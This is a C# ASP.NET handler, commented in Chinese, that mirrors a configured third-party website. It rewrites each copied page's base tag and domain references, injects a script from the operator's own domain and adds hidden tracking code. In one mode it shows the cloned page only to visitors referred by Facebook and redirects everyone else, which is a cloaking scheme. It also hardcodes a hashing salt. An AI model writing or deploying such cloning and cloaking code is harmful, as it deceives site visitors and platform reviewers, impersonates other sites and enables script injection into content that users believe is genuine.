using System;
using System.Linq;
using System.Web;
using System.Configuration;
using System.Collections.Generic;

using System.Text.RegularExpressions;
using System.Collections.Specialized;

using Octopus.Common;
using FBSystem.MyPageCode;

namespace FBSystem
{
    /// <summary>
    /// Default 的摘要说明
    /// </summary>
    public class Default : IHttpHandler
    {
        #region 全局定义
        static Regex reg = new Regex("<base(.*)>");
        static NetHelper helper = new NetHelper();
        static NameValueCollection mySection = (NameValueCollection)ConfigurationManager.GetSection("mySection");
        #endregion

        public void ProcessRequest(HttpContext context)
        {
            #region 设置响应
            context.Response.ContentType = "text/html";
            context.Response.BufferOutput = false;
            context.Response.ExpiresAbsolute = DateTime.Now.AddDays(-1);
            context.Response.Cache.SetExpires(DateTime.Now.AddDays(-1));
            context.Response.Expires = 0;
            context.Response.CacheControl = "no-cache";
            context.Response.Cache.SetNoStore();
            #endregion

            string url = DTRequest.GetQueryString("url");
            string referurl = DTRequest.GetQueryString("referurl");

            string showUrl = mySection["key_CopySite"];//要复制的站点域名
            string key_Skip_Site = mySection["key_Skip_Site"];//跳转到域名
            string key_Skip = mySection["key_Skip"];//跳转类型
            string key_Skip_Site_cur = mySection["key_Skip_Site_Cur"];//当前展示域名

            string backHTML = string.Empty;
            string showLink = string.Empty;

            string key = string.Empty;
            string cache = string.Empty;
            string jsPath = "<script src=\"" + key_Skip_Site_cur + "/js/js.js\"></script>";

            #region 统计代码
            string codeCount = string.Empty;
            string codePath = context.Server.MapPath("code.txt");
            if (System.IO.File.Exists(codePath))
            {
                codeCount = "<div style=\"display:none\">" + CHelper.Common.ReadTextToendByDefault(codePath) + "</div>";
            }
            #endregion

            switch (key_Skip)
            {
                #region 跳转
                case "1":
                    SetURL301(context, key_Skip_Site);
                    break;
                #endregion

                #region Facebook
                case "2":
                    //facebook.com 和 l.facenook.com 不跳转
                    if (referurl.ToLower() == "facebook.com" || referurl.ToLower() == "l.facebook.com")
                    {
                        //将当前域名进行替换处理
                        showLink = url.Replace(key_Skip_Site_cur, showUrl);
                        key = showLink;
                        cache = CacheHelper.Get<string>(key);
                        if (string.IsNullOrEmpty(cache))
                        {
                            #region backHTML
                            APISoapClient clDefault = new APISoapClient();
                            //backHTML = helper.Bost_PostUrl(showLink, string.Empty);
                            backHTML = clDefault.GetPageCode(showLink, UrlMd5(showLink));
                            
                            if (reg.IsMatch(backHTML))
                            {
                                //替换base标签
                                backHTML = reg.Replace(backHTML, "<base target=\"_top\" href=\"" + showUrl + "\" />" + jsPath);
                            }
                            else
                            {
                                backHTML = backHTML.Replace("<head>", "<head>\n<base target=\"_top\" href=\"" + showUrl + "\" />" + jsPath);
                            }

                            //替换
                            backHTML = OpearHTML.replaceStr(backHTML, key_Skip_Site_cur).ToString();
                            backHTML = backHTML.Replace("</html>", codeCount + "\n</html>");

                            #endregion

                            CacheHelper.Insert(key, backHTML);
                            cache = CacheHelper.Get<string>(key);
                        }
                        context.Response.Write(cache);
                    }
                    else
                    {
                        SetURL301(context, key_Skip_Site);
                    }
                    break;
                #endregion

                #region 默认
                default:
                    //将当前域名进行替换处理
                    showLink = url.Replace(key_Skip_Site_cur, showUrl);
                    key = showLink;
                    cache = CacheHelper.Get<string>(key);
                    if (string.IsNullOrEmpty(cache))
                    {
                        #region backHTML

                        APISoapClient clDefault = new APISoapClient();
                        //backHTML = helper.Bost_PostUrl(showLink, string.Empty);
                        backHTML = clDefault.GetPageCode(showLink, UrlMd5(showLink));

                        #region 替换base标签
                        if (reg.IsMatch(backHTML))
                        {
                            //替换base标签
                            backHTML = reg.Replace(backHTML, "<base target=\"_top\" href=\"" + showUrl + "\" />" + jsPath);
                        }
                        else
                        {
                            backHTML = backHTML.Replace("<head>", "<head>\n<base target=\"_top\" href=\"" + showUrl + "\" />" + jsPath);
                        }
                        #endregion

                        //替换
                        backHTML = OpearHTML.replaceStr(backHTML, key_Skip_Site_cur).ToString();
                        backHTML = backHTML.Replace("</html>", codeCount + "\n</html>");

                        #endregion
                        CacheHelper.Insert(key, backHTML);
                        cache = CacheHelper.Get<string>(key);
                    }
                    context.Response.Write(cache);
                    //context.Response.Write(url + "--" + referurl);
                    //context.Response.Write("缓存：" + context.Cache.Count);
                    break;
                #endregion
            }
        }

        #region 失效
        //public string CacheHtml(string showLink, string backHTML)
        //{
        //    //缓存
        //    string key = showLink;
        //    string cache = CacheHelper.Get<string>(key);
        //    if (string.IsNullOrEmpty(cache))
        //    {
        //        CacheHelper.Insert(key, backHTML);
        //        cache = CacheHelper.Get<string>(key);
        //    }
        //    return cache;
        //} 
        #endregion

        #region 301跳转
        /// <summary>
        /// 设置301跳转
        /// </summary>
        /// <param name="Url">要跳转的URL</param>
        public void SetURL301(HttpContext Current, string Url)
        {
            Current.Response.Clear();
            Current.Response.StatusCode = 301;
            Current.Response.Status = "301 Moved Premanet";
            Current.Response.AddHeader("Location", Url);
        }
        #endregion

        #region IsReusable
        public bool IsReusable
        {
            get
            {
                return false;
            }
        }
        #endregion

        #region UrlMd5
        public string UrlMd5(string url)
        {
            if (!string.IsNullOrEmpty(url))
            {
                string scode = "8CE58A07A257433aB8D5F5EA25E1A303";
                string sResult = System.Web.Security.FormsAuthentication.HashPasswordForStoringInConfigFile(url + scode, "MD5");
                return sResult;
            }
            return string.Empty;
        }
        #endregion
    }
}